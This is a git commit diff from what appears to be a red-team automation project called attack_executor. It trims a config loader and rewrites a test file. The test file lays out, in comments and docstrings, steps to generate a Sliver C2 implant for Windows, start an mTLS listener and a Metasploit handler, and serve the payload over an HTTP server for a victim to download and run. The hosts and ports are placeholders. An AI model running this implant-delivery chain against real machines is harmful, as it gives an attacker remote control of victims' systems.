d2f1e99299537d346280d0a3466b256ca63555ff
Lexus Wang <gazhijj@qq.com>
2025-03-03 20:53:10 +0000

    update the test file

--- attack_executor/config.py
+++ attack_executor/config.py
@@ -4,13 +4,6 @@ def load_config(config_file_path="config.ini"):
     config = configparser.ConfigParser()
     config.read(config_file_path)
 
-    debug = config["DEFAULT"].getboolean("debug")
-    log_path = config["DEFAULT"].get("log_path")
-    
-    sliver = config["sliver"].get("client_config_file")
-
-    enable_new_feature = config["feature_flags"].getboolean("enable_new_feature")
-
     return config
 
 if __name__ == "__main__":
--- test/test.py
+++ test/test.py
@@ -1,16 +1,50 @@
-import os
-
-from attack_executor.post_exploit.Sliver import SliverExecutor
-from attack_executor.exploit.Metasploit import MetasploitExecutor
 from attack_executor.config import load_config
 
 config = load_config(config_file_path="/home/user/attack_executor/test/config.ini")
 
-# sliver_exe = SliverExecutor(config = config)
+# from attack_executor.exploit.Metasploit import MetasploitExecutor
+# metasploit_executor = MetasploitExecutor(config)
+# metasploit_executor.exploit_and_execute_payload(
+#                             target = None,
+#                             exploit_module_name = "exploit/multi/handler",
+#                             payload_module_name = "#{payload_name}"",
+#                             listening_host = "#{LHOST}",
+#                             listening_port = "#{LPORT}"):
 
-sliver_exe = SliverExecutor(config = config)
 
-metasploit_exe = MetasploitExecutor(config = config)
+"""
+Executor:
+Sliver Console
+Command:
+sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
+sliver > mlts --lport #{LPORT}
 
+"""
 
+"""
+Executor:
+Human
+Command:
+(This step needs human interaction and (temporarily) cannot be executed automatically)
+(On attacker's machine)
+python -m http.server
 
+(On victim's machine)
+1. Open #{LHOST}:#{LPORT} in the browser
+2. Navigate to the path of the target payload file
+3. Download the payload file
+4. Executet the payload file to #{PATH}
+
+"""
+
+"""
+Executor:
+None
+Command:
+None
+
+"""
+
+from attack_executor.post_exploit.Sliver import SliverExecutor
+sliver_executor = SliverExecutor(config = config)
+# sliver_executor.msf(#{SessionID}, \#{Payload}, \#{LHOST}, \#{LPORT})
